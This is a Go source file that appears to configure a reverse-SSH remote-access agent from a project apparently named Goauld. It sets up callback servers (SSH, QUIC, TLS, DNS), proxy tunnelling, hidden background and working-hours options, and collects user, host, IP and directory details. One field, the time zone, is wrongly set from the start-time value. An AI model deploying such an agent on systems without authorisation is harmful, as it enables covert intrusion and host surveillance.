//go:build mini

package config

import (
	"Goauld/common"
	"Goauld/common/crypto"
	"Goauld/common/log"
	"crypto/md5"
	"fmt"
	"net/url"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"strings"

	"github.com/keygen-sh/machineid"
)

func InitAgent() {

	sshd, err := strconv.ParseBool(_sshd_enabled)
	if err != nil {
		fmt.Println("sshd", err)
	}
	socks, err := strconv.ParseBool(_socks_enabled)
	if err != nil {
		fmt.Println("socks", err)
	}

	http, err := strconv.ParseBool(_http_proxy_enabled)
	if err != nil {
		fmt.Println("http", err)
	}

	proxy, err := url.Parse(_proxy)
	if err != nil {
		fmt.Println("proxy", err)
	}

	socksProxy, err := url.Parse(_socks_custom_proxy)
	if err != nil {
		fmt.Println("socksProxy", err)
	}
	socksUseSystemProxy, err := strconv.ParseBool(_socks_use_system_proxy)
	if err != nil {
		fmt.Println("socksUseSystemProxy", err)
	}

	httpCustomProxy, err := url.Parse(_http_custom_proxy)
	if err != nil {
		fmt.Println("HttpCustomProxy", err)
	}

	noproxy, err := strconv.ParseBool(_no_proxy)
	if err != nil {
		fmt.Println("NoProxy", err)
	}

	rsshPort, err := strconv.Atoi(_rssh_port)
	if err != nil {
		fmt.Println("rsshPort", err)
	}

	socksPort, err := strconv.Atoi(_socks_port)
	if err != nil {
		fmt.Println("socksPort", err)
	}

	httpPort, err := strconv.Atoi(_http_port)
	if err != nil {
		fmt.Println("httpPort", err)
	}

	cfg := &AgentConfig{
		AgePubKey:            _agePubKey,
		Server:               _server,
		SSHServer:            _ssh_server,
		QuicServer:           _quic_domain,
		TLSServer:            _tls_server,
		DNSServer:            strings.Split(_dns_server, ","),
		DNSServerDomain:      _dns_domain,
		LocalSSHPassword:     _shared_password,
		PrivatePassword:      _password_cli,
		Name:                 _name,
		Sshd:                 sshd,
		Socks:                socks,
		HTTP:                 http,
		Proxy:                proxy,
		ProxyUsername:        _proxy_username,
		ProxyPassword:        _proxy_password,
		ProxyDomain:          _proxy_domain,
		SocksCustomProxy:     socksProxy,
		SocksUseSystemProxy:  socksUseSystemProxy,
		SocksProxyUsername:   _socks_proxy_username,
		SocksProxyPassword:   _socks_proxy_password,
		SocksProxyDomain:     _socks_proxy_domain,
		HTTPCustomProxy:      httpCustomProxy,
		HTTPProxyUsername:    _http_proxy_username,
		HTTPProxyPassword:    _http_proxy_password,
		HTTPProxyDomain:      _http_proxy_domain,
		NoProxy:              noproxy,
		RSSHPort:             rsshPort,
		SocksPort:            socksPort,
		HTTPProxyPort:        httpPort,
		KeepAwake:            false,
		KeepAlive:            0,
		Verbose:              0,
		Quiet:                false,
		OnlyWorkingDays:      false,
		WorkingDayStart:      _working_day_start,
		WorkingDayEnd:        _working_day_end,
		WorkingDayTimeZone:   _working_day_start,
		RSSHOrder:            strings.Split(_rssh_order, ","),
		SSHTimeout:           0,
		RemotePortForwarding: nil,
		MaxRetries:           0,
		Version:              false,
		GenerateConfig:       false,
		ConfigFile:           "",
		Background:           false,
		HiddenBackground:     false,
		CustomDNSCommand:     "",
		KillSwitch:           0,
	}

	sharedSecret, err := crypto.GeneratePassword(crypto.PasswordLength)
	if err != nil {
		log.Error().Msg(err.Error())
	}
	crypt, err := crypto.NewCryptor(sharedSecret)
	if err != nil {
		log.Error().Msg(err.Error())
	}

	// Generate the agent name if not provided
	if cfg.Name == "user@hostname" {
		var name string
		userName, err := user.Current()
		if err != nil {
			log.Error().Err(err).Msg("error getting current user")
			return
		}
		if strings.Contains(userName.Username, "\\") {
			parts := strings.Split(userName.Username, "\\")
			if parts[1] != "" {
				name = parts[1]
			} else {
				name = strings.ReplaceAll(userName.Username, "\\", "_")
			}
		} else {
			name = userName.Username
		}

		hostname, err := os.Hostname()
		if err != nil {
			log.Error().Err(err).Msg("error getting hostname")
		}
		cfg.Name = fmt.Sprintf("%s@%s", name, hostname)
	}

	// compute the agent ID used to identify it
	mid, err := machineid.ID()
	if err != nil {
		log.Warn().Err(err).Msg("error generating machineId, using random")
		log.Warn().Err(err).Msg("Multiple agents might run in parallel on the same host")
		mid = cfg.Name
	}
	//nolint:gosec
	id := fmt.Sprintf("%x", md5.Sum([]byte(fmt.Sprintf("%s-%s", mid, cfg.Name))))

	host, err := os.Hostname()
	if err != nil {
		log.Warn().Err(err).Msg("error getting hostname")
	}

	u, err := user.Current()
	if err != nil {
		log.Warn().Err(err).Msg("error getting current user")
	}
	ips, errs := getIPs()
	if len(errs) > 0 {
		log.Error().Err(errs[0]).Msg("error getting ips")
	}

	currDir, err := os.Getwd()
	if err != nil {
		log.Warn().Err(err).Msg("error getting current directory")
	}

	agent = &Agent{
		ID:                       id,
		SSHPrivateKey:            "",
		SharedSecret:             sharedSecret,
		Cryptor:                  crypt,
		cfg:                      cfg,
		IsStaticPasswordDynamic:  false,
		RemoteDynamicPortForward: nil,
		RemotePortForward:        nil,
		Platform:                 runtime.GOOS,
		Architecture:             runtime.GOARCH,
		Username:                 u.Username,
		Hostname:                 host,
		IPs:                      ips,
		Path:                     currDir,
		UnChunkDone:              nil,
	}
}

func (agent *Agent) Env() []string {
	var env []string
	env = append(env, prefixEnv("AGE_PUBKEY", _agePubKey))
	env = append(env, prefixEnv("SERVER", _server))
	env = append(env, prefixEnv("SSH_SERVER", _ssh_server))
	env = append(env, prefixEnv("QUIC_DOMAIN", _quic_domain))
	env = append(env, prefixEnv("TLS_SERVER", _tls_server))
	env = append(env, prefixEnv("DNS_SERVER", _dns_server))
	env = append(env, prefixEnv("DNS_DOMAIN", _dns_domain))
	env = append(env, prefixEnv("PASSWORD", _password_cli))
	env = append(env, prefixEnv("NAME", _name))
	env = append(env, prefixEnv("SSHD", _sshd_enabled))
	env = append(env, prefixEnv("SOCKS", _socks_enabled))
	env = append(env, prefixEnv("HTTP", _http_proxy_enabled))
	env = append(env, prefixEnv("PROXY", _proxy))
	env = append(env, prefixEnv("PROXY_USERNAME", _proxy_username))
	env = append(env, prefixEnv("PROXY_PASSWORD", _proxy_password))
	env = append(env, prefixEnv("PROXY_DOMAIN", _proxy_domain))
	env = append(env, prefixEnv("SOCKS_CUSTOM_PROXY", _socks_custom_proxy))
	env = append(env, prefixEnv("SOCKS_PROXY", _socks_use_system_proxy))
	env = append(env, prefixEnv("SOCKS_PROXY_USERNAME", _socks_proxy_username))
	env = append(env, prefixEnv("SOCKS_PROXY_PASSWORD", _socks_proxy_password))
	env = append(env, prefixEnv("SOCKS_PROXY_DOMAIN", _socks_proxy_domain))
	env = append(env, prefixEnv("HTTP_CUSTOM_PROXY", _http_custom_proxy))
	env = append(env, prefixEnv("HTTP_PROXY_USERNAME", _http_proxy_username))
	env = append(env, prefixEnv("HTTP_PROXY_PASSWORD", _http_proxy_password))
	env = append(env, prefixEnv("HTTP_PROXY_DOMAIN", _http_proxy_domain))
	env = append(env, prefixEnv("NO_PROXY", _no_proxy))
	env = append(env, prefixEnv("RSSH_PORT", _rssh_port))
	env = append(env, prefixEnv("SOCKS_PORT", _socks_port))
	env = append(env, prefixEnv("HTTP_PORT", _http_port))
	env = append(env, prefixEnv("KEEP_AWAKE", _keepawake))
	env = append(env, prefixEnv("KEEPALIVE", _keepalive))
	env = append(env, prefixEnv("VERBOSE", _verbosity))
	env = append(env, prefixEnv("QUIET", _quiet))
	env = append(env, prefixEnv("ONLY_WORKING_DAYS", _only_working_days))
	env = append(env, prefixEnv("WORKING_DAY_START", _working_day_start))
	env = append(env, prefixEnv("WORKING_DAY_END", _working_day_end))
	env = append(env, prefixEnv("WORKING_DAY_TIMEZONE", _working_day_timezone))
	env = append(env, prefixEnv("RSSH_ORDER", _rssh_order))
	env = append(env, prefixEnv("SSH_TIMEOUT", _rssh_timeout))
	env = append(env, prefixEnv("RPF", _remote_port_forwarding))
	env = append(env, prefixEnv("MAX_RETRIES", _max_retries))
	env = append(env, prefixEnv("VERSION", _version))
	env = append(env, prefixEnv("GENERATE_CONFIG", _generate_config))
	env = append(env, prefixEnv("CONFIG_FILE", _config_file))
	env = append(env, prefixEnv("BACKGROUND", _background))
	env = append(env, prefixEnv("CUSTOM_DNS_COMMAND", _custom_dns_command))
	env = append(env, prefixEnv("KILL_SWITCH", _killswitch))
	env = append(env, prefixEnv("DISABLE_PASSWORD", _disable_password))
	return env
}

// prefixEnv adds the application name to the provided value and returns it
// as an environment variable.
func prefixEnv(name string, value string) string {
	return fmt.Sprintf("%s_%s=%s", strings.ToUpper(common.AppName()), strings.ToUpper(name), value)
}
